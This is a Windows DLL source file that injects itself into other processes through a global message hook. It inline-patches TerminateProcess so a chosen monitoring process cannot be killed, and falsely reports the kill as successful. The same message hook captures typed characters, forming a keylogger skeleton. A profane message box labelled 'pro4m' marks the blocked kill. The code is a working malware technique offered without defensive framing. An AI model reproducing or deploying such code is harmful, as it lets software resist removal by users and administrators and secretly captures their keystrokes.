
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>


#define NULLSTR ""
#define NULLCHAR '\0'
#define SPACESTR " "

// proc-hooking x64 assembly definitions
#define	PROCHOOK_MOVCODE 0x48
#define PROCHOOK_64BITADDR 0xB8
#define PROCHOOK_JMPCODE 0xFF
#define PROCHOOK_REGCODE 0xE0

typedef struct _ProcHook
{
	BYTE byMovCode = PROCHOOK_MOVCODE;
	BYTE byAddrType = PROCHOOK_64BITADDR;
	unsigned __int64 ui64Address;
	BYTE byJmpCode = PROCHOOK_JMPCODE;
	BYTE byRegisterCode = PROCHOOK_REGCODE;
}PROCHOOK, *PPROCHOOK;


typedef struct _HookRec
{
	unsigned __int64	ui64AddressFunc;
	unsigned __int64	ui64AddressShadowFunc;
	PROCHOOK			phOld;
	PROCHOOK			phNew;
}HOOKREC, *PHOOKREC;


void WINAPI StartMonitoring(void);
void WINAPI StopMonitoring(void);

// process handle to block terminateprocess for
DWORD __dwRootAppID = 0;

// hook handles
HHOOK __hHook;

HINSTANCE _hDll;
DWORD _dwCurrentProcessID = 0;

// monitoring app and hook statuses
BOOL _bIsRootApp = FALSE;
BOOL _bIsHooked = FALSE;

HOOKREC _hrTerminateProcess;


LRESULT CALLBACK WINAPI MsgProc(int, WPARAM, LPARAM);


BOOL WINAPI ShadowTerminateProcess(HANDLE, UINT);

// private functions

void WINAPI CreateAllHooks(void);
void WINAPI DestroyAllHooks(void);
void WINAPI CreateHook(unsigned __int64, unsigned __int64, PHOOKREC);
void WINAPI DestroyHook(PHOOKREC);
void WINAPI HookFunction(PHOOKREC);
void WINAPI UnhookFunction(PHOOKREC);



/*
*
* dll main
*
*/
BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{

		// initialize instance wide globals
		_hDll = hModule;
		_dwCurrentProcessID = GetCurrentProcessId();
		
		// create hooks
		CreateAllHooks();

		break;
	}
	case DLL_PROCESS_DETACH:
	{

		// destroy hooks
		DestroyAllHooks();

		
		break;
	}
	case DLL_THREAD_ATTACH:
	{
		break;
	}
	case DLL_THREAD_DETACH:
	{
		break;
	}
	}

	return TRUE;
}



/*
*
* message hooking function
*
*/
LRESULT CALLBACK WINAPI MsgHookingProc(int iCode, WPARAM wParam, LPARAM lParam)
{
	char szKey[2] = NULLSTR;
	MSG FAR * pMsg;

	// create hooks
	CreateAllHooks();

	// process keystroke message, append to buffer... if it isnt the monitoring process
	if (_bIsRootApp == FALSE)
	{
		pMsg = (MSG FAR *)lParam;
		if (pMsg->message == WM_CHAR)
		{
			if (wParam == PM_REMOVE)
			{
				szKey[0] = (char)pMsg->wParam;
				
			}
		}
	}

	// pass the message on
	return CallNextHookEx(__hHook, iCode, wParam, lParam);
}

void WINAPI StartMonitoring(void)
{

	// since this is obviously the monitoring app... set appropriate vars, and then destroy hooks if neccessary
	_bIsRootApp = TRUE;
	__dwRootAppID = GetCurrentProcessId();
	DestroyAllHooks();

	
	// start system message hook
	__hHook = SetWindowsHookEx(WH_GETMESSAGE, MsgHookingProc, _hDll, 0);

	return;
}

void WINAPI StopMonitoring(void)
{

	// unhook msg hook
	UnhookWindowsHookEx(__hHook);

	return;
}


BOOL WINAPI ShadowTerminateProcess(HANDLE hProcess, UINT uiExitCode)
{
	BOOL bRet = FALSE;
	BOOL bAllow = TRUE;
	HANDLE hProcessDuplicate = NULL;

	// check to make sure that this process isnt being protected
	DuplicateHandle(GetCurrentProcess(), hProcess, GetCurrentProcess(), (LPHANDLE)&hProcessDuplicate, PROCESS_QUERY_INFORMATION, TRUE, 0);
	if (GetProcessId(hProcess) == __dwRootAppID)
	{
		bAllow = FALSE;
	}
	CloseHandle(hProcessDuplicate);

	// pass on call is allowed, otherwise lie and say it worked
	if (bAllow == TRUE)
	{
		UnhookFunction((PHOOKREC)&_hrTerminateProcess);
		bRet = TerminateProcess(hProcess, uiExitCode);
		HookFunction((PHOOKREC)&_hrTerminateProcess);
	}
	else
	{
		bRet = 1;
	}
	MessageBox(NULL, L"Cannot fuck this!", L"pro4m", 0);
	return bRet;
}


void WINAPI CreateAllHooks(void)
{
	if (_bIsRootApp == FALSE)
	{
		if (_bIsHooked == FALSE)
		{
			_bIsHooked = TRUE;
			CreateHook((unsigned __int64)TerminateProcess, (unsigned __int64)ShadowTerminateProcess, (PHOOKREC)&_hrTerminateProcess);
		}
	}

	return;
}

void WINAPI DestroyAllHooks(void)
{
	if (_bIsHooked == TRUE)
	{
		_bIsHooked = FALSE;
		
		DestroyHook((PHOOKREC)&_hrTerminateProcess);
	}

	return;
}

void WINAPI CreateHook(unsigned __int64 ui64AddressFunc, unsigned __int64 ui64AddressShadowFunc, PHOOKREC phr)
{
	DWORD dwOldAttr;

	// setup hookrec structure
	phr->ui64AddressFunc = ui64AddressFunc;
	phr->ui64AddressShadowFunc = ui64AddressShadowFunc;
	phr->phNew.ui64Address = ui64AddressShadowFunc;
	memcpy((void *)&phr->phOld, (LPVOID)phr->ui64AddressFunc, sizeof(PROCHOOK));

	// unprotect memory
	if (VirtualProtect((void *)phr->ui64AddressFunc, sizeof(PROCHOOK), PAGE_EXECUTE_READWRITE, &dwOldAttr) == FALSE)
	{
		
	}

	// hook function
	HookFunction(phr);

	return;
}

void WINAPI DestroyHook(PHOOKREC phr)
{

	// unhook function
	UnhookFunction(phr);

	// reset hookrec
	phr->ui64AddressFunc = 0;
	phr->ui64AddressShadowFunc = 0;
	phr->phNew.ui64Address = 0;
	memset((void *)&phr->phOld, 0, sizeof(PROCHOOK));

	return;
}

void WINAPI HookFunction(PHOOKREC phr)
{

	// copy the jump bytes over top of the function
	memcpy((void *)phr->ui64AddressFunc, (const void *)&phr->phNew, sizeof(PROCHOOK));

	return;
}

void WINAPI UnhookFunction(PHOOKREC phr)
{

	// copy the original bytes over top of the jump bytes
	memcpy((void *)phr->ui64AddressFunc, (const void *)&phr->phOld, sizeof(PROCHOOK));

	return;
}